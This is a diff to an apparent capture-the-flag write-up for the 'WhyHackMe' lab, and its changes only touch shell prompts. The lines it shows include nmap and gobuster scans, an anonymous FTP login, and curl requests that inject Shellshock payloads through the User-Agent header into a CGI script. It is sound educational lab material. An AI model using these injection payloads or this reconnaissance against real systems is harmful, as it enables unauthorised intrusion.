@@ -20,7 +20,7 @@ Please allow the machine 2 - 3 minutes to boot up.</p>
 <h3>nmap</h3>
 
 ```bash
-:~# nmap -sC -sV -Pn -p- -T4 TargetIP
+:~/WhyHackMe# nmap -sC -sV -Pn -p- -T4 TargetIP
 ...
 Host is up (0.00072s latency).
 Not shown: 65531 closed ports
@@ -52,7 +52,7 @@ PORT      STATE    SERVICE VERSION
 <h3>FTP</h3>
 
 ```bash
-:~# ftp TargetIP
+:~/WhyHackMe# ftp TargetIP
 Connected to TargetIP.
 220 (vsFTPd 3.0.3)
 Name (10.10.161.40:root): anonymous
@@ -82,7 +82,7 @@ ftp> exit
 - <code>127.0.0.1/dir/pass.txt</code></p>
 
 ```bash
-:~# cat update.txt
+:~/WhyHackMe# cat update.txt
 Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
 - admin
 ```
@@ -90,7 +90,7 @@ Hey I just removed the old user mike because that account was compromised and fo
 <h3>gobuster</h3>
 
 ```bash
-:~# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100
+:~/WhyHackMe# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100
 ...
 /.php                 (Status: 403) [Size: 277]
 /dir                  (Status: 403) [Size: 277]
@@ -108,7 +108,7 @@ Hey I just removed the old user mike because that account was compromised and fo
 <br>
 
 ```bash
-:~# gobuster dir -u http://TargetIP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+:~/WhyHackMe# gobuster dir -u http://TargetIP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 ...
 /.hta                 (Status: 403) [Size: 278]
 /.htpasswd            (Status: 403) [Size: 278]
@@ -138,13 +138,13 @@ Hey I just removed the old user mike because that account was compromised and fo
 <h3>Tested Reflected</h3>
 
 ```bash
-~/WhyHackMe# curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://TargetIP/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
+:~/WhyHackMe# curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://TargetIP/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
 ```
 
 <h3> Tested Blind with sleep</h3>
 
 ```bash
-:~# :~/WhyHackMe# curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://TargetIP/cgi-bin/admin.cgi
+:~/WhyHackMe# curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://TargetIP/cgi-bin/admin.cgi
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>403 Forbidden</title>
